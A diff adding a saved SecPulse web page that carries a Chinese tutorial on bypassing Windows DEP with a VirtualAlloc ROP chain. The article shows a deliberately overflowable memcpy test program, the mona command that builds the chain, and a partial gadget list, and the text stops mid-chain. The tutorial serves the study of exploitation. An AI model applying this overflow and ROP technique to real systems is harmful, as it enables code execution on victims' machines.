@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<title>Windows Shellcode学习笔记——利用VirtualAlloc绕过DEP - SecPulse.COM | 安全脉搏</title>
+<meta name="description" content="0x00 前言" />
+<meta name="keywords" content="Immunity Debugger,OLLYDBG,VirtualAllocEx()函数申请的内存大小为固定值,VirtualAlloc绕过DEP,Windows Shellcode学习笔记,利用VirtualAlloc绕过DEP,构造ROP链,正常调用API实现VirtualProtect和VirtualAlloc不会存在跨内存页失败的问题" />
+
+<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
+<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
+<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
+<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
+<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
+<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
+<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
+<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
+<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
+<link rel='canonical' href='https://www.secpulse.com/archives/57373.html' />
+<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+</head>
+<body class="single single-post postid-57373 single-format-standard">
+	<header id="header" class="header clr">
+		<div class="header-top inner clr">
+	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
+	</h4>
+	</hgroup>
+
+<div class="login xs-hidden">
+				<div class="logindiv">
+					<div class="img">
+<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
+						class="fa fa-caret-down fa-2"></i>
+					<ul class="login-links">
+						<li class="log"><a
+							href="https://www.secpulse.com/wp-login.php"
+							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
+						<li class="exit"><a
+							href="https://www.secpulse.com/wp-login.php?action=register"><i
+								class="fa fa-user-times"></i><span>注册</span></a></li>
+					</ul>
+	
+  </div>
+			</div>
+			<div class="top-search xs-hidden">
+  <form id="search" method="get" action="https://www.secpulse.com" >
+	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
+	<button class="btn-search"> <i class="fa fa-search"></i></button>
+</form></div>
+			<div class="menu-button">
+				<i class="fa fa-bars fa-3x"></i>
+			</div>
+		</div>
+
+
+		<div class="main-nav  xs-hidden">
+			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
+<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
+<ul class="sub-menu">
+	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
+	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
+	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
+	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
+	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
+	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
+	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
+	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
+	<ul class="sub-menu">
+		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
+		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
+	</ul>
+</li>
+	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
+</ul>
+</li>
+<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
+<ul class="sub-menu">
+	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
+	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
+</ul>
+</li>
+<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
+<ul class="sub-menu">
+	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
+	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
+	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
+	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
+</ul>
+</li>
+<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
+<ul class="sub-menu">
+	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
+	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
+	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
+	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
+</ul>
+</li>
+<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
+<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
+<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
+<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
+</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
+<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
+<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
+</ul></nav></div>
+		</div>
+		<div class="nav-bg"></div>
+   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
+	<ul class="sub-menu">
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
+		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
+	</ul>
+</li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
+</ul></nav>     </header><section class="xs-main index-main clr">
+<div class="inner">
+<div class="xs-left">
+<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/articles">文章</a> &gt; <a href="https://www.secpulse.com/archives/category/articles/system" rel="category tag">系统安全</a> &gt;  正文 </nav><article id="post-57373" class="post-57373 post type-post status-publish format-standard has-post-thumbnail hentry category-system tag-immunity-debugger tag-ollydbg tag-virtualallocex tag-virtualallocdep tag-windows-shellcode tag-rop tag-apivirtualprotectvirtualalloc">
+	<header class="single-header">
+		<h1>Windows Shellcode学习笔记——利用VirtualAlloc绕过DEP</h1>
+			<div class="single-meta">
+				
+		    <div class="time"><i></i> <a href="javascript:void(0);">2017 /4/6 10:24</a></div>
+			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">11,401</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/57373.html#respond">沙发</a></div>
+			
+			
+		</div>
+		<!-- .entry-meta -->
+	</header>
+	<!-- .single-header -->
+
+	<div class="single-main">
+		<h2><strong>0x00 前言</strong></h2>
+<p>接着介绍DEP绕过的另一种方法——利用<a href="https://www.secpulse.com/archives/tag/VirtualAlloc绕过DEP" target="_blank">VirtualAlloc绕过DEP</a>。通过VirtualAlloc函数可以申请一段具有可执行属性的内存，相比于VirtualProtect，传入VirtualAlloc的四个参数不需要先读取再赋值，可在shellcode中直接指定，结构更简单。当然，利用Immunity Debugger的mona插件可自动构造利用VirtualAlloc绕过DEP的ROP链。</p>
+<h2><strong>0x01 简介</strong></h2>
+<p>本文将要介绍以下内容：</p>
+<p>1. 调用VirtualAlloc函数时的Bug及修复</p>
+<p>2. 选择合适的替代指令，修改mona自动生成的rop链，实现利用</p>
+<p>3. 利用VirtualAlloc绕过DEP时需要考虑的细节，如对shellcode的长度要求</p>
+<h2><strong>0x02 相关概念</strong></h2>
+<p>VirtualAlloc:</p>
+<table class="syntaxhighlighter  html" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="html plain">LPVOID WINAPI VirtualAlloc( </code></div>
+<div class="line number2 index1 alt1"><code class="html plain">LPVOID lpAddress, </code></div>
+<div class="line number3 index2 alt2"><code class="html plain">SIZE_T dwSize, </code></div>
+<div class="line number4 index3 alt1"><code class="html plain">DWORD flAllocationType, </code></div>
+<div class="line number5 index4 alt2"><code class="html plain">DWORD flProtect </code></div>
+<div class="line number6 index5 alt1"><code class="html plain">)</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+<p>lpAddress:申请内存区域的地址</p>
+<p>dwSize:申请内存区域的大小</p>
+<p>flAllocationType:申请内存的类型</p>
+<p>flProtect:申请内存的访问控制类型</p>
+<p>申请成功时函数返回申请内存的起始地址，申请失败时返回NULL</p>
+<h2><strong>0x03 实际测试</strong></h2>
+<p>测试环境：</p>
+<table class="syntaxhighlighter  html" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="html plain">测试系统： Win 7</code></div>
+<div class="line number2 index1 alt1"><code class="html plain">编译器： VS2012</code></div>
+<div class="line number3 index2 alt2"><code class="html plain">build版本： Release</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+<p>项目属性：</p>
+<table class="syntaxhighlighter  html" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="html plain">关闭GS</code></div>
+<div class="line number2 index1 alt1"><code class="html plain">关闭优化</code></div>
+<div class="line number3 index2 alt2"><code class="html plain">关闭SEH</code></div>
+<div class="line number4 index3 alt1"><code class="html plain">打开DEP</code></div>
+<div class="line number5 index4 alt2"><code class="html plain">关闭ASLR</code></div>
+<div class="line number6 index5 alt1"><code class="html plain">禁用c++异常</code></div>
+<div class="line number7 index6 alt2"><code class="html plain">禁用内部函数</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+<p>注：</p>
+<p>详细配置方法在上篇文章有说明</p>
+<p>同样是测试memcpy的缓冲器溢出，测试POC如下：</p>
+<table class="syntaxhighlighter  html" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="html plain">unsigned int shellcode[]=</code></div>
+<div class="line number2 index1 alt1"><code class="html plain">{     </code></div>
+<div class="line number3 index2 alt2"><code class="html spaces">      </code><code class="html plain">0x90909090,0x90909090,0x90909090,0x90909090,</code></div>
+<div class="line number4 index3 alt1"><code class="html spaces">      </code><code class="html plain">0x90909090,0x90909090,0x90909090,0x90909090,</code></div>
+<div class="line number5 index4 alt2"><code class="html spaces">      </code><code class="html plain">0x90909090,0x90909090,0x90909090,0x90909090,</code></div>
+<div class="line number6 index5 alt1"><code class="html spaces">      </code><code class="html plain">0x90909090,</code></div>
+<div class="line number7 index6 alt2"><code class="html spaces">      </code><code class="html plain">0x41414141,  </code></div>
+<div class="line number8 index7 alt1"><code class="html spaces">      </code><code class="html plain">0x41414141</code></div>
+<div class="line number9 index8 alt2"><code class="html plain">};</code></div>
+<div class="line number10 index9 alt1"><code class="html plain">void test()</code></div>
+<div class="line number11 index10 alt2"><code class="html plain">{</code></div>
+<div class="line number12 index11 alt1"><code class="html spaces">    </code><code class="html plain">char buffer[48];    </code></div>
+<div class="line number13 index12 alt2"><code class="html spaces">    </code><code class="html plain">printf("3n");</code></div>
+<div class="line number14 index13 alt1"><code class="html spaces">    </code><code class="html plain">memcpy(buffer,shellcode,sizeof(shellcode));</code></div>
+<div class="line number15 index14 alt2"><code class="html plain">}</code></div>
+<div class="line number16 index15 alt1"><code class="html plain">int main()</code></div>
+<div class="line number17 index16 alt2"><code class="html plain">{</code></div>
+<div class="line number18 index17 alt1"><code class="html spaces">    </code><code class="html plain">printf("1n");</code></div>
+<div class="line number19 index18 alt2"><code class="html spaces">    </code><code class="html plain">test();</code></div>
+<div class="line number20 index19 alt1"><code class="html spaces">    </code><code class="html plain">return 0;</code></div>
+<div class="line number21 index20 alt2"><code class="html plain">}</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+<p>编译成exe，使用<a href="https://www.secpulse.com/archives/tag/Immunity Debugger" target="_blank">Immunity Debugger</a>打开</p>
+<p>使用mona插件自动生成rop链，输入：</p>
+<table class="syntaxhighlighter  html" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="html plain">!mona rop -m *.dll -cp nonull</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+<p>查看rop_chains.txt，会列出可用来关闭DEP的ROP链</p>
+<p>选择VirtualAlloc函数，详情如下：</p>
+<table class="syntaxhighlighter  html" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="html plain">Register setup for VirtualAlloc() :</code></div>
+<div class="line number2 index1 alt1"><code class="html plain">--------------------------------------------</code></div>
+<div class="line number3 index2 alt2"><code class="html spaces"> </code><code class="html plain">EAX = NOP (0x90909090)</code></div>
+<div class="line number4 index3 alt1"><code class="html spaces"> </code><code class="html plain">ECX = flProtect (0x40)</code></div>
+<div class="line number5 index4 alt2"><code class="html spaces"> </code><code class="html plain">EDX = flAllocationType (0x1000)</code></div>
+<div class="line number6 index5 alt1"><code class="html spaces"> </code><code class="html plain">EBX = dwSize</code></div>
+<div class="line number7 index6 alt2"><code class="html spaces"> </code><code class="html plain">ESP = lpAddress (automatic)</code></div>
+<div class="line number8 index7 alt1"><code class="html spaces"> </code><code class="html plain">EBP = ReturnTo (ptr to jmp esp)</code></div>
+<div class="line number9 index8 alt2"><code class="html spaces"> </code><code class="html plain">ESI = ptr to VirtualAlloc()</code></div>
+<div class="line number10 index9 alt1"><code class="html spaces"> </code><code class="html plain">EDI = ROP NOP (RETN)</code></div>
+<div class="line number11 index10 alt2"><code class="html spaces"> </code><code class="html plain">--- alternative chain ---</code></div>
+<div class="line number12 index11 alt1"><code class="html spaces"> </code><code class="html plain">EAX = ptr to &amp;VirtualAlloc()</code></div>
+<div class="line number13 index12 alt2"><code class="html spaces"> </code><code class="html plain">ECX = flProtect (0x40)</code></div>
+<div class="line number14 index13 alt1"><code class="html spaces"> </code><code class="html plain">EDX = flAllocationType (0x1000)</code></div>
+<div class="line number15 index14 alt2"><code class="html spaces"> </code><code class="html plain">EBX = dwSize</code></div>
+<div class="line number16 index15 alt1"><code class="html spaces"> </code><code class="html plain">ESP = lpAddress (automatic)</code></div>
+<div class="line number17 index16 alt2"><code class="html spaces"> </code><code class="html plain">EBP = POP (skip 4 bytes)</code></div>
+<div class="line number18 index17 alt1"><code class="html spaces"> </code><code class="html plain">ESI = ptr to JMP [EAX]</code></div>
+<div class="line number19 index18 alt2"><code class="html spaces"> </code><code class="html plain">EDI = ROP NOP (RETN)</code></div>
+<div class="line number20 index19 alt1"><code class="html spaces"> </code><code class="html plain">+ place ptr to "jmp esp" on stack, below PUSHAD</code></div>
+<div class="line number21 index20 alt2"><code class="html plain">--------------------------------------------</code></div>
+<div class="line number22 index21 alt1"><code class="html plain">ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :</code></div>
+<div class="line number23 index22 alt2"><code class="html plain">--------------------------------------------------------</code></div>
+<div class="line number24 index23 alt1"><code class="html plain">*** [ C ] ***</code></div>
+<div class="line number25 index24 alt2"><code class="html spaces">  </code><code class="html plain">#define CREATE_ROP_CHAIN(name, ...) </code></div>
+<div class="line number26 index25 alt1"><code class="html spaces">    </code><code class="html plain">int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); </code></div>
+<div class="line number27 index26 alt2"><code class="html spaces">    </code><code class="html plain">unsigned int name[name##_length / sizeof(unsigned int)]; </code></div>
+<div class="line number28 index27 alt1"><code class="html spaces">    </code><code class="html plain">create_rop_chain(name, ##__VA_ARGS__);</code></div>
+<div class="line number29 index28 alt2"><code class="html spaces">  </code><code class="html plain">int create_rop_chain(unsigned int *buf, unsigned int )</code></div>
+<div class="line number30 index29 alt1"><code class="html spaces">  </code><code class="html plain">{</code></div>
+<div class="line number31 index30 alt2"><code class="html spaces">    </code><code class="html plain">// rop chain generated with mona.py - www.corelan.be</code></div>
+<div class="line number32 index31 alt1"><code class="html spaces">    </code><code class="html plain">unsigned int rop_gadgets[] = {</code></div>
+<div class="line number33 index32 alt2"><code class="html spaces">      </code><code class="html plain">0x693a2e92,  // POP ECX // RETN [MSVCR110.dll] </code></div>
+<div class="line number34 index33 alt1"><code class="html spaces">      </code><code class="html plain">0x693bd19c,  // ptr to &amp;VirtualAlloc() [IAT MSVCR110.dll]</code></div>
+<div class="line number35 index34 alt2"><code class="html spaces">      </code><code class="html plain">0x69353486,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] </code></div>
+<div class="line number36 index35 alt1"><code class="html spaces">      </code><code class="html plain">0x779f9dca,  // XCHG EAX,ESI // RETN [ntdll.dll] </code></div>
+<div class="line number37 index36 alt2"><code class="html spaces">      </code><code class="html plain">0x69370742,  // POP EBP // RETN [MSVCR110.dll] </code></div>
+<div class="line number38 index37 alt1"><code class="html spaces">      </code><code class="html plain">0x75dac58d,  // &amp; call esp [KERNELBASE.dll]</code></div>
+<div class="line number39 index38 alt2"><code class="html spaces">      </code><code class="html plain">0x6932ea52,  // POP EAX // RETN [MSVCR110.dll] </code></div>
+<div class="line number40 index39 alt1"><code class="html spaces">      </code><code class="html plain">0xffffffff,  // Value to negate, will become 0x00000001</code></div>
+<div class="line number41 index40 alt2"><code class="html spaces">      </code><code class="html plain">0x69353746,  // NEG EAX // RETN [MSVCR110.dll] </code></div>
+<div class="line number42 index41 alt1"><code class="html spaces">      </code><code class="html plain">0x75da655d,  // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] </code></div>
+<div class="line number43 index42 alt2"><code class="html spaces">      </code><code class="html plain">0x77216829,  // POP EAX // RETN [kernel32.dll] </code></div>
+<div class="line number44 index43 alt1"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number45 index44 alt2"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number46 index45 alt1"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number47 index46 alt2"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number48 index47 alt1"><code class="html spaces">      </code><code class="html plain">0xa2800fc0,  // put delta into eax (-&gt; put 0x00001000 into edx)</code></div>
+<div class="line number49 index48 alt2"><code class="html spaces">      </code><code class="html plain">0x7721502a,  // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] </code></div>
+<div class="line number50 index49 alt1"><code class="html spaces">      </code><code class="html plain">0x771abd3a,  // XCHG EAX,EDX // RETN [kernel32.dll] </code></div>
+<div class="line number51 index50 alt2"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number52 index51 alt1"><code class="html spaces">      </code><code class="html plain">0x69329bb1,  // POP EAX // RETN [MSVCR110.dll] </code></div>
+<div class="line number53 index52 alt2"><code class="html spaces">      </code><code class="html plain">0xffffffc0,  // Value to negate, will become 0x00000040</code></div>
+<div class="line number54 index53 alt1"><code class="html spaces">      </code><code class="html plain">0x69354484,  // NEG EAX // RETN [MSVCR110.dll] </code></div>
+<div class="line number55 index54 alt2"><code class="html spaces">      </code><code class="html plain">0x771d0946,  // XCHG EAX,ECX // RETN [kernel32.dll] </code></div>
+<div class="line number56 index55 alt1"><code class="html spaces">      </code><code class="html plain">0x6935e68f,  // POP EDI // RETN [MSVCR110.dll] </code></div>
+<div class="line number57 index56 alt2"><code class="html spaces">      </code><code class="html plain">0x69354486,  // RETN (ROP NOP) [MSVCR110.dll]</code></div>
+<div class="line number58 index57 alt1"><code class="html spaces">      </code><code class="html plain">0x693a7031,  // POP EAX // RETN [MSVCR110.dll] </code></div>
